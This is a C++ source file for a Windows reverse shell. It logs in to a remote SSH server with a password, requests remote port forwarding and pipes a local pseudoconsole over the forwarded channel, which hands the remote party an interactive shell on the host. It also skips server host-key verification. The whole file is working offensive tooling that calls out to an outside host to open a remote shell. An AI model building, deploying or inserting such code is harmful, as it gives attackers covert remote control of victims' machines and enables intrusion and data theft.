#include "pseudoconsole.cpp"
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <stdexcept>
#include <cassert>
#include <iostream>
#include <thread>

class ReverseShell {
	ssh_session session;
	ssh_channel channel;
	const char *remoteAddress;

	void printInternalErrors();

public:
	ReverseShell(const char *address, const char *username);
	~ReverseShell();

	void Connect(int port, const char *password);
};

ReverseShell::ReverseShell(const char *address, const char *username) {
	session = ssh_new();
	remoteAddress = address;

	auto verbosity = SSH_LOG_INFO;

	ssh_options_set(session, SSH_OPTIONS_HOST, address);
	ssh_options_set(session, SSH_OPTIONS_USER, username);
	ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
}

ReverseShell::~ReverseShell() {
	if (channel != nullptr) {
		ssh_channel_close(channel);
		ssh_channel_free(channel);
	}
	if (session != nullptr) {
		ssh_disconnect(session);
		ssh_free(session);
	}
}

void ReverseShell::printInternalErrors() {
	std::cerr << "!! ssh internal error messages:\n";
	if (session != nullptr) {
		std::cout << "- session: " << ssh_get_error(session) << "\n";
	}
	if (channel != nullptr) {
		std::cout << "- channel: " << ssh_get_error(channel) << "\n";
	}
}

void readShell(PTY *pty, ssh_channel *channel) {
	const DWORD bufferSize = 5;
	char buffer[bufferSize];

	while ( ssh_channel_is_open(*channel) ) {
		memset(buffer, 0, bufferSize);
		DWORD bytesRead;
		auto readSuccess = ReadFile(pty->outputReadSide, buffer, bufferSize, &bytesRead, NULL);
		if (!readSuccess) {
			auto err = GetLastError();
			if (err != ERROR_HANDLE_EOF) {
				std::cerr << "read shell: " << err << "\n";
			}
			break;
		}

		// for (int i=0; i<bytesRead; i++) {
		// 	printf("%hhx ", buffer[i]);
		// }

		auto bytesWritten = ssh_channel_write(*channel, buffer, bytesRead);
		if (bytesWritten <= 0) {
			std::cerr << "writing shell->client";
			break;
		}
	}

	ssh_channel_close(*channel);
	pty->close();
}

void readClient(PTY *pty, ssh_channel *channel) {
	const DWORD bufferSize = 512;
	char buffer[bufferSize];
	
	while ( ssh_channel_is_open(*channel) ) {
		auto bytesRead = ssh_channel_read(*channel, buffer, bufferSize, false);
		if (bytesRead == 0) {
			std::cerr << "hit eof\n";
			// hit eof, just exit
			break;
		}
		if (bytesRead <= 0) {
			std::cout << "code: " << bytesRead << "\n";
			break;
		}

		DWORD bytesWritten;
		auto writeSuccess = WriteFile(pty->inputWriteSide, buffer, bytesRead, &bytesWritten, NULL);
		if (!writeSuccess) {
			std::cerr << "writing client->shell: " << GetLastError() << "\n";
			std::cerr << "bytes written: " << bytesWritten << "\n";
			break;
		}
	}

	std::cerr << "client exit\n";
	ssh_channel_close(*channel);
	pty->close();
}

void ReverseShell::Connect(int port, const char *password) {
	std::cout << "connecting.." << "\n";
	if (ssh_connect(session)) {
		std::cerr << ssh_get_error(session) << "\n";
		throw std::runtime_error("connecting");
	}

	// TODO: properly authenticate the server
	if (ssh_session_update_known_hosts(session)) {
		std::cerr << ssh_get_error(session) << "\n";
		throw std::runtime_error("updating known hosts");
	}

	std::cout << "authenticating.." << "\n";
	auto authStatus = ssh_userauth_password(session, NULL, password);
	if (authStatus) {
		std::cerr << "auth status: " << authStatus << "\n";
		std::cerr << ssh_get_error(session) << "\n";
		throw std::runtime_error("authenticating");
	}

	std::cout << "sending forwarding request.." << "\n";
	if (ssh_channel_listen_forward(session, NULL, port, NULL)) {
		std::cerr << ssh_get_error(session) << "\n";
		throw std::runtime_error("forwarding request");
	}

	char *originator;
	int originatorPort;
	std::cout << "waiting channel open.." << "\n";
	channel = ssh_channel_open_forward_port(session, 100000, NULL, &originator, &originatorPort);
	if (channel == NULL) {
		std::cerr << ssh_get_error(session) << "\n";
		throw std::runtime_error("channel open request");
	}

	std::cout << "- originator: " << originator << "\n";
	std::cout << "- originatorPort: " << originatorPort << "\n";
	ssh_string_free_char(originator);

	std::cout << "channel open: " << ssh_channel_is_open(channel) << "\n";

	PTY pty;
	auto result = pty.createPseudoConsole();
	if (FAILED(result)) {
		fprintf(stderr, "%x\n", result);
		throw std::runtime_error("creating pseudoconsole");
	}

	std::thread	thread1(readShell, &pty, &channel);
	std::thread thread2(readClient, &pty, &channel);
	thread1.join();
	thread2.join();
}
